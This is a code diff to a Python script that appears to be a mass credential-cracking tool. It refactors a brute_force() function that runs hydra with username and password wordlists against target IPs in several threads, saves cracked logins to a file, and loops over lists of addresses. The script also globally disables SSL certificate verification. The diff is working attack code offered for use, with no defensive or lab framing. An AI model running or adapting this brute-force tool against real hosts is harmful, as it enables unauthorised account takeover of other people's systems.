@@ -5,6 +5,9 @@ import os.path
 import socket
 import threading
 import subprocess
+import logging
+
+logging.basicConfig(level=logging.INFO)
 
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
@@ -112,13 +115,24 @@ def multi_ip(iparray):
     t8.start()
 
 
-#uses a subprocess - hydra - to crack
+def brute_force(ip, output_file='cracked.txt', username_file='usernames.txt', password_file='passwords.txt', threads=4):
+    try:
+        hydra_command = [
+            "hydra", "-o", output_file, "-V", "-f", "-t", str(threads), 
+            "-L", username_file, "-P", password_file, ip
+        ]
+        logging.info("Starting brute force on IP: %s", ip)
+        result = subprocess.run(hydra_command, capture_output=True, text=True, check=True)
+        
+        # If you want to print Hydra's output to the console, uncomment the following lines:
+        # print(result.stdout)
+        # print(result.stderr)
 
-def brute_force(ip):
-
-        #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","admin","-P","passwords.txt",ip])                 
-        #subprocess.call(["hydra","-o cracked.txt","-V","-f","-l","ignite","-P","passwords.txt",ip])
-        subprocess.call(["hydra","-o cracked.txt","-V","-f","-t","4","-L","usernames.txt","-P","passwords.txt",ip])                 
+        logging.info("Brute force completed for IP: %s", ip)
+    except subprocess.CalledProcessError as e:
+        logging.error("Hydra encountered an error: %s", e.stderr)
+    except Exception as e:
+        logging.exception("An unexpected error occurred: %s", str(e))
 
 #gets ips one by one to brute_force()
 def brute_force_check():
